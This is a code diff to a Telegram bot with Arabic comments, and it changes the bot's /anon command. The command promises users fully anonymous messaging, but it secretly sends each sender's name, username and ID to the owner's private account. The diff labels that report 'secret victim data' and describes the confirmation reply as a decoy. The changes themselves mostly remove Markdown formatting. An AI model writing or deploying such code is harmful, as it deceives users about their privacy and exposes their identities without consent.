@@ -57,13 +57,13 @@ async def cmd_start(message: types.Message):
     await message.answer("أهلاً، أنا رون. إذا مو جاي تسولف بشي ممتع، لا تتعب نفسك😴.")
 
 # 1️⃣ أمر الرسالة المجهولة المزيفة (يُعالج أولاً وينفذ المقلب)
+# 1️⃣ أمر الرسالة المجهولة المزيفة (نسخة ضد أخطاء الـ Parse Mode)
 @dp.message(Command("anon"))
 async def cmd_anonymous_fake(message: types.Message):
-    # تقسيم النص لأخذ الكلام الذي بعد الأمر مباشرة
     text_parts = message.text.split(maxsplit=1)
     
     if len(text_parts) < 2 or not text_parts[1].strip():
-        await message.reply("❗ اكتب رسالتك بعد الأمر يا حلو، مثلاً:\n`/anon 😑 ترا شخصيتك مستفزة`")
+        await message.reply("❗ اكتب رسالتك بعد الأمر يا عبقري، مثلاً:\n`/anon رون ترا شخصيتك مستفزة`")
         return
 
     user_msg = text_parts[1].strip()
@@ -71,26 +71,26 @@ async def cmd_anonymous_fake(message: types.Message):
     user_username = f"@{message.from_user.username}" if message.from_user.username else "لا يوجد يوزر"
     user_id = message.from_user.id
 
-    # تجهيز التقرير السري الذي سيصل لحسابك الخاص
+    # تنظيف النص وتجهيزه بدون فورمات معقد يسبب أخطاء لتليكرام
     secret_report = (
-        f"📬 **وصلتك رسالة مجهولة (مقلب كذب):**\n\n"
-        f"💬 **الرسالة:** {user_msg}\n\n"
-        f"--- بيانات الضحية السريّة --- \n"
-        f"👤 **الاسم:** {user_first_name}\n"
-        f"🆔 **المعرف:** {user_username}\n"
-        f"🔢 **الـ ID:** `{user_id}`"
+        f"📬 وصلتك رسالة مجهولة جديدة:\n\n"
+        f"💬 الرسالة: {user_msg}\n\n"
+        f"👥 بيانات الضحية السرية:\n"
+        f"👤 الاسم: {user_first_name}\n"
+        f"🆔 اليوزر: {user_username}\n"
+        f"🔢 الـ ID: {user_id}"
     )
 
     try:
-        # إرسال البيانات لك بالخاص
-        await bot.send_message(chat_id=YOUR_TELEGRAM_ID, text=secret_report, parse_mode="Markdown")
-        # الرد التمويهي في المجموعة أو الشات لإيهام الضحية بنجاح التخفي
+        # أرسلناها كنص عادي بدون parse_mode لتجنب أي تعليق أو خطأ برمجي بسبب الرموز
+        await bot.send_message(chat_id=YOUR_TELEGRAM_ID, text=secret_report)
+        
+        # الرد التمويهي في الجروب
         await message.reply("🚀 تم إرسال رسالتك بسرية تامة وبشكل مجهول 100%! الحين رون بيموت بمكانه يبي يعرف منو أنت هههههههه.")
     except Exception as e:
-        # طباعة الخطأ في الكونسول إذا لم تفعل البوت بالخاص أو الـ ID غلط
-        print(f"[ERROR فشل إرسال التقرير السري للحساب بسبب: {e}")
+        print(f"[ERROR] فشل إرسال التقرير السري لحسابك بسبب: {e}")
         await message.reply("❌ البوت واجه مشكلة برمجية في إرسال الرسالة السرية.")
-
+        
 # 2️⃣ استقبال النصوص العام للـ AI (يتجاهل تماماً أي رسالة تبدأ بـ / لضمان عدم التداخل)
 @dp.message(F.text & ~F.text.startswith("/"))
 async def handle_text(message: types.Message):
